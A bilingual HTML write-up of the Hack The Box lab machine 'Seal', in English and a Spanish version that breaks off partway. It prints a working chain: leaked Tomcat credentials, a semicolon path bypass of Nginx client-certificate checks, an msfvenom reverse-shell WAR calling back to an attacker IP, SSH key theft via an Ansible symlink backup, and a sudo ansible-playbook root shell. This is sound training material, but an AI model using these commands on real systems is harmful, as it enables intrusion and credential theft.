@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>seal | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">seal</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ===== ENGLISH ===== -->
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p>
+                        Seal is a medium-difficulty Linux machine that chains together several interesting techniques.
+                        The attack begins with source code disclosure via an unauthenticated GitBucket instance, where
+                        two public repositories expose both the application source and hardcoded Tomcat manager
+                        credentials buried in a past commit.
+                    </p>
+                    <p>
+                        With credentials in hand, access to the Tomcat Manager is blocked by mutual TLS
+                        authentication enforced at the Nginx reverse proxy layer. However, a well-known path
+                        normalisation discrepancy between Nginx and Tomcat allows bypassing this check by injecting a
+                        semicolon-delimited path segment (e.g. <code>/manager;name=bypass/html</code>), causing Nginx
+                        to skip its location block while Tomcat resolves the canonical path normally.
+                    </p>
+                    <p>
+                        Once inside the Tomcat Manager, a malicious <code>.war</code> file containing a JSP reverse
+                        shell is deployed, granting a foothold as the <code>tomcat</code> user. Lateral movement to
+                        <code>luis</code> is achieved by abusing an Ansible playbook that runs periodically as
+                        <code>luis</code> and follows symlinks during backup — placing a symlink to
+                        <code>/home/luis/.ssh/id_rsa</code> inside the synced directory causes the private key to be
+                        included in the next archive. Finally, <code>luis</code> holds unrestricted
+                        <code>sudo</code> rights over <code>ansible-playbook</code>, which is trivially escalated to
+                        a root shell via a custom playbook that spawns an interactive shell.
+                    </p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an Nmap scan to identify open ports and services:</p>
+
+                <img src="./media/image3.png" alt="Nmap scan results showing open ports including SSH on 22, HTTPS on 443 and GitBucket on 8080" />
+
+                <p>The scan reveals three noteworthy services: SSH on port 22, an HTTPS server on port 443, and
+                    something running on port 8080. The TLS certificate on port 443 leaks the hostname
+                    <code>seal.htb</code>, which I add to <code>/etc/hosts</code>.</p>
+
+                <img src="./media/image4.png" alt="TLS certificate details showing the seal.htb hostname" />
+
+                <h2>Source Code Disclosure via GitBucket</h2>
+                <p>Port 8080 hosts a <strong>GitBucket</strong> instance. No credentials are needed to register, so I
+                    create an account and browse the public repositories. Two repositories are visible:</p>
+                <ul>
+                    <li><code>root/seal_market</code> — the web application running on port 443</li>
+                    <li><code>root/infra</code> — infrastructure configuration</li>
+                </ul>
+                <p>The <code>README.md</code> of <code>seal_market</code> contains a telling ToDo list:</p>
+                <blockquote>
+                    <p>Remove mutual authentication for dashboard, setup registration and login features.<br>
+                    Deploy updated tomcat configuration.<br>
+                    Disable manager and host-manager.</p>
+                </blockquote>
+                <p>The mention of <em>mutual authentication</em> is significant — it means the Nginx reverse proxy is
+                    configured to verify a client certificate before forwarding requests to certain paths. Without the
+                    correct client certificate, those paths return <code>403</code>.</p>
+                <p>Also visible in the repository are two email addresses belonging to system users:
+                    <code>alex@seal.htb</code> and <code>luis@seal.htb</code>.</p>
+                <p>Digging through the commit history of <code>seal_market</code>, I find a commit titled
+                    <em>"Updating tomcat configuration"</em> that exposes hardcoded credentials in clear text:</p>
+                <pre><code class="language-xml"><span style="color:#e06c75;">&lt;user</span> <span style="color:#d19a66;">username</span>=<span style="color:#98c379;">"tomcat"</span> <span style="color:#d19a66;">password</span>=<span style="color:#98c379;">"42MrHBf*z8{Z%"</span> <span style="color:#d19a66;">roles</span>=<span style="color:#98c379;">"manager-gui,admin-gui"</span><span style="color:#e06c75;">/&gt;</span></code></pre>
+
+                <p>Inspecting the Nginx <code>sites-available</code> configuration in the repository confirms the
+                    mutual authentication setup:</p>
+                <pre><code class="language-nginx"><span style="color:#e06c75;">location</span> <span style="color:#98c379;">/manager/html</span> {
+    <span style="color:#c678dd;">if</span> (<span style="color:#d19a66;">$ssl_client_verify</span> != <span style="color:#98c379;">SUCCESS</span>) {
+        <span style="color:#e06c75;">return</span> <span style="color:#d19a66;">403</span>;
+    }
+}</code></pre>
+                <p>The same check applies to <code>/admin/dashboard</code> and <code>/host-manager/html</code>. Without
+                    a trusted client certificate, all of these paths are blocked at the proxy level. The Tomcat version
+                    is also visible in 404 error pages: <strong>Apache Tomcat/9.0.31 (Ubuntu)</strong>.</p>
+
+                <h2>Mutual Authentication Bypass — Nginx/Tomcat Path Normalisation</h2>
+                <p>Since the client certificate is nowhere to be found in the repositories, I research bypass
+                    techniques and come across a Black Hat USA 2018 research paper by Orange Tsai titled <em>"Breaking
+                    Parser Logic"</em>:</p>
+                <p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p>
+
+                <img src="./media/image1.png" alt="Slide from Orange Tsai's Black Hat research showing path normalisation differences between Nginx and Tomcat, particularly around semicolons" />
+
+                <p>The key insight is that Nginx and Tomcat parse URL paths differently when a semicolon is present.
+                    Nginx evaluates <code>/manager;name=bypass/html</code> and does <strong>not</strong> match its
+                    <code>location /manager/html</code> block — so it forwards the request unmodified. Tomcat, on the
+                    other hand, strips the semicolon-delimited path parameter and resolves the request as
+                    <code>/manager/html</code> — the protected path — granting access.</p>
+
+                <p>In practice:</p>
+                <ul>
+                    <li>Requesting <code>/manager/html</code> → Nginx matches, returns <code>403</code></li>
+                    <li>Requesting <code>/manager;name=bypass/html</code> → Nginx does not match the location block, forwards to Tomcat → Tomcat resolves as <code>/manager/html</code>, serves the page</li>
+                </ul>
+
+                <h2>Accessing Tomcat Manager</h2>
+                <p>Using the bypass path and the credentials found in the git history, I successfully log in to the
+                    Tomcat Manager web interface:</p>
+
+                <img src="./media/image2.png" alt="Tomcat Manager login prompt accessed via the path normalisation bypass" />
+
+                <img src="./media/image5.png" alt="Tomcat Manager web interface showing deployed applications and the deploy section" />
+
+                <h2>Initial Access — JSP Reverse Shell via WAR Deployment</h2>
+                <p>With access to the Tomcat Manager, deploying a malicious application is straightforward. I generate
+                    a reverse shell WAR file using <code>msfvenom</code>:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">msfvenom</span> <span style="color:#d19a66;">-p</span> java/shell_reverse_tcp <span style="color:#d19a66;">lhost</span>=10.10.14.195 <span style="color:#d19a66;">lport</span>=443 <span style="color:#d19a66;">-f</span> war <span style="color:#d19a66;">-o</span> rev.war</code></pre>
+
+                <p>The first deploy attempt fails — because I was not using the virtual host <code>seal.htb</code> in
+                    the URL. Once I switch to using the correct hostname, the WAR deploys successfully and the new
+                    application context appears in the deployed applications list:</p>
+
+                <img src="./media/image6.png" alt="Tomcat Manager showing the newly deployed /rev application context after successful WAR upload" />
+
+                <p>I set up a netcat listener and visit the deployed path to trigger the reverse shell:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">nc</span> <span style="color:#d19a66;">-lvnp</span> 443</code></pre>
+
+                <p>The connection comes back and I have a shell as the <code>tomcat</code> user.</p>
+
+                <h2>Lateral Movement — Ansible Symlink Abuse</h2>
+                <p>Enumerating the system I find user <code>luis</code> on the machine. Listing the home directory
+                    reveals a <code>.ssh</code> folder, but it is only accessible by <code>luis</code>:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">ls</span> <span style="color:#d19a66;">-lah</span> /home/luis/
+<span style="color:#abb2bf;">drwxr-xr-x 9 luis luis 4.0K May  7  2021 .
+drwxr-xr-x 3 root root 4.0K May  5  2021 ..
+drwxrwxr-x 3 luis luis 4.0K May  7  2021 .ansible
+lrwxrwxrwx 1 luis luis    9 May  5  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 luis luis  220 May  5  2021 .bash_logout
+-rw-r--r-- 1 luis luis 3.8K May  5  2021 .bashrc
+drwxr-xr-x 3 luis luis 4.0K May  7  2021 .cache
+drwxrwxr-x 3 luis luis 4.0K May  5  2021 .config
+drwxrwxr-x 6 luis luis 4.0K Mar  1 18:13 .gitbucket
+-rw-r--r-- 1 luis luis  51M Jan 14  2021 gitbucket.war
+drwxrwxr-x 3 luis luis 4.0K May  5  2021 .java
+drwxrwxr-x 3 luis luis 4.0K May  5  2021 .local
+-rw-r--r-- 1 luis luis  807 May  5  2021 .profile
+drwx------ 2 luis luis 4.0K May  7  2021 .ssh
+-r-------- 1 luis luis   33 Mar  1 18:14 user.txt</span></code></pre>
+
+                <p>I try the Tomcat credentials with <code>luis</code> but there is no credential reuse.</p>
+
+                <p>Checking <code>/opt/backups</code> reveals an interesting setup:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">ls</span> <span style="color:#d19a66;">-lah</span> /opt/backups/
+<span style="color:#abb2bf;">drwxr-xr-x 4 luis luis 4.0K Mar  1 19:18 .
+drwxr-xr-x 3 root root 4.0K May  7  2021 ..
+drwxrwxr-x 2 luis luis 4.0K Mar  1 19:18 archives
+drwxrwxr-x 2 luis luis 4.0K May  7  2021 playbook</span>
+
+<span style="color:#61afef;">ls</span> <span style="color:#d19a66;">-lah</span> /opt/backups/archives/
+<span style="color:#abb2bf;">-rw-rw-r-- 1 luis luis 592K Mar  1 19:15 backup-2026-03-01-19:15:32.gz
+-rw-rw-r-- 1 luis luis 592K Mar  1 19:16 backup-2026-03-01-19:16:32.gz
+-rw-rw-r-- 1 luis luis 592K Mar  1 19:17 backup-2026-03-01-19:17:32.gz
+-rw-rw-r-- 1 luis luis 592K Mar  1 19:18 backup-2026-03-01-19:18:33.gz</span></code></pre>
+
+                <p>The <code>playbook</code> directory contains the automation script driving the backups:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">cat</span> /opt/backups/playbook/run.yml</code></pre>
+                <pre><code class="language-yaml"><span style="color:#e06c75;">- hosts:</span> <span style="color:#98c379;">localhost</span>
+  <span style="color:#e06c75;">tasks:</span>
+    <span style="color:#e06c75;">- name:</span> <span style="color:#98c379;">Copy Files</span>
+      <span style="color:#e06c75;">synchronize:</span> <span style="color:#d19a66;">src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes</span>
+    <span style="color:#e06c75;">- name:</span> <span style="color:#98c379;">Server Backups</span>
+      <span style="color:#e06c75;">archive:</span>
+        <span style="color:#e06c75;">path:</span> <span style="color:#98c379;">/opt/backups/files/</span>
+        <span style="color:#e06c75;">dest:</span> <span style="color:#98c379;">"/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"</span>
+    <span style="color:#e06c75;">- name:</span> <span style="color:#98c379;">Clean</span>
+      <span style="color:#e06c75;">file:</span>
+        <span style="color:#e06c75;">state:</span> <span style="color:#98c379;">absent</span>
+        <span style="color:#e06c75;">path:</span> <span style="color:#98c379;">/opt/backups/files/</span></code></pre>
+
+                <p>The critical detail here is <code>copy_links=yes</code> in the <code>synchronize</code> task. This
+                    flag tells Ansible (which uses <code>rsync</code> under the hood) to follow symbolic links and copy
+                    the actual file content rather than the symlink itself. The source directory for the sync is
+                    <code>/var/lib/tomcat9/webapps/ROOT/admin/dashboard</code>, where <code>tomcat</code> has write
+                    access.</p>
+
+                <p>Using <code>pspy64</code> to monitor running processes confirms that <code>luis</code> (UID=1000)
+                    executes this playbook periodically:</p>
+                <pre><code class="language-bash"><span style="color:#abb2bf;">CMD: UID=1000 PID=15371 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml</span></code></pre>
+
+                <p>The attack plan: place a symlink pointing to <code>/home/luis/.ssh/id_rsa</code> inside the
+                    <code>uploads</code> subdirectory of the synced dashboard folder. When the playbook runs as
+                    <code>luis</code>, it will follow the symlink (because <code>luis</code> can read their own SSH
+                    key) and include the key contents in the backup archive.</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ln</span> <span style="color:#d19a66;">-s</span> /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/xd</code></pre>
+
+                <p>After waiting for the next backup cycle, I copy the latest archive to <code>/tmp</code> (the
+                    archives directory has restrictive permissions in context) and decompress it:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">cp</span> /opt/backups/archives/backup-2026-03-01-19:51:32.gz /tmp/
+<span style="color:#61afef;">gunzip</span> /tmp/backup-2026-03-01-19:51:32.gz</code></pre>
+
+                <p>The resulting file is a POSIX tar archive. Attempting to extract it directly fails because
+                    <code>tar</code> interprets the colons in the filename as a remote host specification. The
+                    <code>--force-local</code> flag fixes this:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">tar</span> <span style="color:#d19a66;">-xf</span> backup-2026-03-01-19:51:32 <span style="color:#d19a66;">--force-local</span></code></pre>
+
+                <p>Navigating to the extracted <code>uploads/</code> directory reveals the symlink was followed and
+                    the file <code>xd</code> now contains <code>luis</code>'s private SSH key. I copy the contents,
+                    save them as <code>id_rsa</code> on my local machine, set correct permissions, and connect:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">chmod</span> 600 id_rsa
+<span style="color:#61afef;">ssh</span> <span style="color:#d19a66;">-i</span> id_rsa luis@seal.htb</code></pre>
+
+                <p>I am now logged in as <code>luis</code> and can read the user flag.</p>
+
+                <h2>Privilege Escalation — sudo ansible-playbook</h2>
+                <p>Checking sudo permissions as <code>luis</code>:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">sudo</span> <span style="color:#d19a66;">-l</span></code></pre>
+                <pre><code class="language-plaintext">Matching Defaults entries for luis on seal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User luis may run the following commands on seal:
+    (ALL) NOPASSWD: /usr/bin/ansible-playbook *</code></pre>
+
+                <p><code>luis</code> can run <code>ansible-playbook</code> with any argument as root, without a
+                    password. This is a well-known privilege escalation vector documented on GTFOBins:
+                    <a href="https://gtfobins.github.io/gtfobins/ansible-playbook/#shell">https://gtfobins.github.io/gtfobins/ansible-playbook/#shell</a>
+                </p>
+
+                <p>The technique is simple: write a custom playbook that uses Ansible's <code>shell</code> module to
+                    spawn an interactive shell connected to the current terminal:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">echo</span> <span style="color:#98c379;">'[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]'</span> &gt; /tmp/xd.yml
+<span style="color:#61afef;">sudo</span> ansible-playbook /tmp/xd.yml</code></pre>
+
+                <pre><code class="language-plaintext">[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'
+
+PLAY [localhost] ***************************************************************************
+
+TASK [Gathering Facts] *********************************************************************
+ok: [localhost]
+
+TASK [shell] *******************************************************************************
+# whoami
+root</code></pre>
+
+                <p>The playbook executes the shell as root, granting full system access and the root flag.</p>
+            </div>
+
+            <!-- ===== SPANISH ===== -->
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p>
+                        Seal es una máquina Linux de dificultad media que encadena varias técnicas interesantes. El
+                        ataque comienza con divulgación de código fuente a través de una instancia de GitBucket accesible
+                        sin autenticación, donde dos repositorios públicos exponen la aplicación y unas credenciales del
+                        manager de Tomcat enterradas en un commit antiguo.
+                    </p>
+                    <p>
+                        Con las credenciales en mano, el acceso al Tomcat Manager está bloqueado por autenticación mutua
+                        TLS aplicada en la capa del proxy inverso Nginx. Sin embargo, una conocida discrepancia en la
+                        normalización de rutas entre Nginx y Tomcat permite saltarse esta comprobación inyectando un
+                        segmento de ruta delimitado por punto y coma (ej. <code>/manager;name=bypass/html</code>),
+                        haciendo que Nginx ignore su bloque <code>location</code> mientras Tomcat resuelve la ruta
+                        canónica con normalidad.
+                    </p>
+                    <p>
+                        Una vez dentro del Tomcat Manager, se despliega un fichero <code>.war</code> malicioso con una
+                        reverse shell JSP, obteniendo acceso inicial como <code>tomcat</code>. El movimiento lateral
+                        hasta <code>luis</code> se consigue abusando de un playbook de Ansible que se ejecuta
+                        periódicamente como <code>luis</code> y sigue enlaces simbólicos durante el backup — colocando un
+                        symlink a <code>/home/luis/.ssh/id_rsa</code> dentro del directorio sincronizado, la clave
+                        privada queda incluida en el siguiente archivo. Finalmente, <code>luis</code> tiene permisos de
+                        <code>sudo</code> sin restricciones sobre <code>ansible-playbook</code>, lo que se escala
+                        trivialmente a una shell como root mediante un playbook personalizado.
+                    </p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de Nmap para identificar puertos abiertos y servicios:</p>
+
+                <img src="./media/image3.png" alt="Resultados del escaneo de Nmap mostrando puertos abiertos: SSH en 22, HTTPS en 443 y GitBucket en 8080" />
+
+                <p>El escaneo revela tres servicios destacables: SSH en el puerto 22, un servidor HTTPS en el 443 y
+                    algo en el puerto 8080. El certificado TLS del puerto 443 filtra el hostname
+                    <code>seal.htb</code>, que añado a <code>/etc/hosts</code>.</p>
+
+                <img src="./media/image4.png" alt="Detalles del certificado TLS mostrando el hostname seal.htb" />
+
+                <h2>Divulgación de Código Fuente vía GitBucket</h2>
+                <p>El puerto 8080 aloja una instancia de <strong>GitBucket</strong>. No se requieren credenciales para
+                    registrarse, así que creo una cuenta y navego por los repositorios públicos. Son visibles dos
+                    repositorios:</p>
+                <ul>
+                    <li><code>root/seal_market</code> — la aplicación web que corre en el puerto 443</li>
+                    <li><code>root/infra</code> — configuración de infraestructura</li>
+                </ul>
+                <p>El <code>README.md</code> de <code>seal_market</code> contiene una lista de tareas pendientes muy
+                    reveladora:</p>
+                <blockquote>
+                    <p>Remove mutual authentication for dashboard, setup registration and login features.<br>
+                    Deploy updated tomcat configuration.<br>
+                    Disable manager and host-manager.</p>
+                </blockquote>
+                <p>La mención de <em>autenticación mutua</em> es significativa — significa que el proxy inverso Nginx
+                    está configurado para verificar un certificado de cliente antes de reenviar peticiones a ciertas
+                    rutas. Sin el certificado de cliente correcto, esas rutas devuelven <code>403</code>.</p>
+                <p>También son visibles en el repositorio dos direcciones de email pertenecientes a usuarios del
+                    sistema: <code>alex@seal.htb</code> y <code>luis@seal.htb</code>.</p>
+                <p>Buscando en el historial de commits de <code>seal_market</code>, encuentro un commit titulado
+                    <em>"Updating tomcat configuration"</em> que expone credenciales en texto claro:</p>
+                <pre><code class="language-xml"><span style="color:#e06c75;">&lt;user</span> <span style="color:#d19a66;">username</span>=<span style="color:#98c379;">"tomcat"</span> <span style="color:#d19a66;">password</span>=<span style="color:#98c379;">"42MrHBf*z8{Z%"</span> <span style="color:#d19a66;">roles</span>=<span style="color:#98c379;">"manager-gui,admin-gui"</span><span style="color:#e06c75;">/&gt;</span></code></pre>
+
+                <p>Inspeccionando la configuración de Nginx en <code>sites-available</code> del repositorio se confirma
+                    el esquema de autenticación mutua:</p>
+                <pre><code class="language-nginx"><span style="color:#e06c75;">location</span> <span style="color:#98c379;">/manager/html</span> {
+    <span style="color:#c678dd;">if</span> (<span style="color:#d19a66;">$ssl_client_verify</span> != <span style="color:#98c379;">SUCCESS</span>) {
+        <span style="color:#e06c75;">return</span> <span style="color:#d19a66;">403</span>;
+    }
+}</code></pre>
+                <p>La misma comprobación se aplica a <code>/admin/dashboard</code> y
+                    <code>/host-manager/html</code>. Sin un certificado de cliente de confianza, todas estas rutas
+                    quedan bloqueadas a nivel de proxy. La versión de Tomcat también es visible en páginas de error
+                    404: <strong>Apache Tomcat/9.0.31 (Ubuntu)</strong>.</p>
+
+                <h2>Bypass de Autenticación Mutua — Normalización de Rutas Nginx/Tomcat</h2>
+                <p>Como el certificado de cliente no aparece por ningún lado en los repositorios, investigo técnicas
+                    de bypass y encuentro una ponencia de Black Hat USA 2018 de Orange Tsai titulada <em>"Breaking
+                    Parser Logic"</em>:</p>
+                <p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p>
+
+                <img src="./media/image1.png" alt="Diapositiva de la investigación de Orange Tsai en Black Hat mostrando las diferencias de normalización de rutas entre Nginx y Tomcat, en particular con los puntos y coma" />
+
+                <p>La clave es que Nginx y Tomcat parsean las rutas URL de forma diferente cuando hay un punto y coma.
+                    Nginx evalúa <code>/manager;name=bypass/html</code> y <strong>no</strong> coincide con su bloque
+                    <code>location /manager/html</code> — por lo que reenvía la petición sin modificar. Tomcat, en
+                    cambio, elimina el parámetro de ruta delimitado por punto y coma y resuelve la petición como
+                    <code>/manager/html</code> — la ruta protegida — concediendo acceso.</p>
+
+                <p>En la práctica:</p>
+                <ul>
+                    <li>Petición a <code>/manager/html</code> → Nginx la intercepta, devuelve <code>403</code></li>
+                    <li>Petición a <code>/manager;name=bypass/html</code> → Nginx no coincide con el bloque location, reenvía a Tomcat → Tomcat lo resuelve como <code>/manager/html</code> y sirve la página</li>
+                </ul>
+
+                <h2>Acceso al Tomcat Manager</h2>
+                <p>Usando la ruta de bypass y las credenciales encontradas en el historial de git, inicio sesión
+                    satisfactoriamente en la interfaz web del Tomcat Manager:</p>
+
+                <img src="./media/image2.png" alt="Prompt de login del Tomcat Manager accedido mediante el bypass de normalización de rutas" />
+
+                <img src="./media/image5.png" alt="Interfaz web del Tomcat Manager mostrando las aplicaciones desplegadas y la sección de despliegue" />
+
+                <h2>Acceso Inicial — Reverse Shell JSP mediante Despliegue WAR</h2>
+                <p>Con acceso al Tomcat Manager, desplegar una aplicación maliciosa es sencillo. Genero un fichero WAR
+                    con reverse shell usando <code>msfvenom</code>:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">msfvenom</span> <span style="color:#d19a66;">-p</span> java/shell_reverse_tcp <span style="color:#d19a66;">lhost</span>=10.10.14.195 <span style="color:#d19a66;">lport</span>=443 <span style="color:#d19a66;">-f</span> war <span style="color:#d19a66;">-o</span> rev.war</code></pre>
+
+                <p>El primer intento de despliegue falla — porque no estaba usando el virtual host <code>seal.htb</code>
+                    en la URL. Una vez cambio al hostname correcto, el WAR se despliega con éxito y el nuevo contexto de
+                    aplicación aparece en la lista de aplicaciones desplegadas:</p>
+
+                <img src="./media/image6.png" alt="Tomcat Manager mostrando el contexto /rev recién desplegado tras subir el WAR correctamente" />
+
+                <p>Pongo un listener con netcat y visito la ruta desplegada para activar la reverse shell:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">nc</span> <span style="color:#d19a66;">-lvnp</span> 443</code></pre>
+
+                <p>La conexión entra y tengo una shell como el usuario <code>tomcat</code>.</p>
+
+                <h2>Movimiento Lateral — Abuso de Symlinks en Ansible</h2>
+                <p>Enumerando el sistema encuentro al usuario <code>luis</code> en la máquina. Listando su home se
+                    aprecia una carpeta <code>.ssh</code>, pero solo es accesible por <code>luis</code>:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">ls</span> <span style="color:#d19a66;">-lah</span> /home/luis/
+<span style="color:#abb2bf;">drwxr-xr-x 9 luis luis 4.0K May  7  2021 .
+drwxr-xr-x 3 root root 4.0K May  5  2021 ..
+drwxrwxr-x 3 luis luis 4.0K May  7  2021 .ansible
+lrwxrwxrwx 1 luis luis    9 May  5  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 luis luis  220 May  5  2021 .bash_logout
+-rw-r--r-- 1 luis luis 3.8K May  5  2021 .bashrc
+drwxr-xr-x 3 luis luis 4.0K May  7  2021 .cache
+drwxrwxr-x 3 luis luis 4.0K May  5  2021 .config
+drwxrwxr-x 6 luis luis 4.0K Mar  1 18:13 .gitbucket
+-rw-r--r-- 1 luis luis  51M Jan 14  2021 gitbucket.war
+drwxrwxr-x 3 luis luis 4.0K May  5  2021 .java
+drwxrwxr-x 3 luis luis 4.0K May  5  2021 .local
+-rw-r--r-- 1 luis luis  807 May  5  2021 .profile
+drwx------ 2 luis luis 4.0K May  7  2021 .ssh
+-r-------- 1 luis luis   33 Mar  1 18:14 user.txt</span></code></pre>
+
+                <p>Pruebo las credenciales de Tomcat con <code>luis</code> pero no hay reutilización de credenciales.</p>
+
+                <p>Revisando <code>/opt/backups</code> aparece una configuración interesante:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">ls</span> <span style="color:#d19a66;">-lah</span> /opt/backups/
+<span style="color:#abb2bf;">drwxr-xr-x 4 luis luis 4.0K Mar  1 19:18 .
+drwxr-xr-x 3 root root 4.0K May  7  2021 ..
+drwxrwxr-x 2 luis luis 4.0K Mar  1 19:18 archives
+drwxrwxr-x 2 luis luis 4.0K May  7  2021 playbook</span>
+
+<span style="color:#61afef;">ls</span> <span style="color:#d19a66;">-lah</span> /opt/backups/archives/
+<span style="color:#abb2bf;">-rw-rw-r-- 1 luis luis 592K Mar  1 19:15 backup-2026-03-01-19:15:32.gz
+-rw-rw-r-- 1 luis luis 592K Mar  1 19:16 backup-2026-03-01-19:16:32.gz
+-rw-rw-r-- 1 luis luis 592K Mar  1 19:17 backup-2026-03-01-19:17:32.gz
+-rw-rw-r-- 1 luis luis 592K Mar  1 19:18 backup-2026-03-01-19:18:33.gz</span></code></pre>
+
+                <p>El directorio <code>playbook</code> contiene el script de automatización que genera los backups:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">cat</span> /opt/backups/playbook/run.yml</code></pre>
+                <pre><code class="language-yaml"><span style="color:#e06c75;">- hosts:</span> <span style="color:#98c379;">localhost</span>
+  <span style="color:#e06c75;">tasks:</span>
+    <span style="color:#e06c75;">- name:</span> <span style="color:#98c379;">Copy Files</span>
+      <span style="color:#e06c75;">synchronize:</span> <span style="color:#d19a66;">src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes</span>
+    <span style="color:#e06c75;">- name:</span> <span style="color:#98c379;">Server Backups</span>
+      <span style="color:#e06c75;">archive:</span>
+        <span style="color:#e06c75;">path:</span> <span style="color:#98c379;">/opt/backups/files/</span>
+        <span style="color:#e06c75;">dest:</span> <span style="color:#98c379;">"/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"</span>
+    <span style="color:#e06c75;">- name:</span> <span style="color:#98c379;">Clean</span>
+      <span style="color:#e06c75;">file:</span>
+        <span style="color:#e06c75;">state:</span> <span style="color:#98c379;">absent</span>
+        <span style="color:#e06c75;">path:</span> <span style="color:#98c379;">/opt/backups/files/</span></code></pre>
+
+                <p>El detalle crítico es <code>copy_links=yes</code> en la tarea <code>synchronize</code>. Esta opción
+                    indica a Ansible (que usa <code>rsync</code> internamente) que siga los enlaces simbólicos y copie
+                    el contenido real del fichero en lugar del symlink. El directorio fuente de la sincronización es
+                    <code>/var/lib/tomcat9/webapps/ROOT/admin/dashboard</code>, donde <code>tomcat</code> tiene acceso
+                    de escritura.</p>
+
+                <p>Usando <code>pspy64</code> para monitorizar procesos en ejecución se confirma que <code>luis</code>
+                    (UID=1000) ejecuta este playbook periódicamente:</p>
+                <pre><code class="language-bash"><span style="color:#abb2bf;">CMD: UID=1000 PID=15371 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml</span></code></pre>
+
+                <p>El plan de ataque: colocar un symlink que apunte a <code>/home/luis/.ssh/id_rsa</code> dentro del
+                    subdirectorio <code>uploads</code> del directorio sincronizado del dashboard. Cuando el playbook se
+                    ejecute como <code>luis</code>, seguirá el symlink (porque <code>luis</code> puede leer su propia
+                    clave SSH) e incluirá el contenido de la clave en el archivo de backup.</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ln</span> <span style="color:#d19a66;">-s</span> /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/xd</code></pre>
+
+                <p>Tras esperar al siguiente ciclo de backup, copio el último archivo a <code>/tmp</code> y lo
+                    descomprimo:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">cp</span> /opt/backups/archives/backup-2026-03-01-19:51:32.gz /tmp/
+<span style="color:#61afef;">gunzip</span> /tmp/backup-2026-03-01-19:51:32.gz</code></pre>
+
+                <p>El fichero resultante es un archivo tar POSIX. Intentar extraerlo directamente falla porque
+                    <code>tar</code> interpreta los dos puntos del nombre como una especificación de host remoto. La
+                    flag <code>--force-local</code> soluciona el problema:</p>
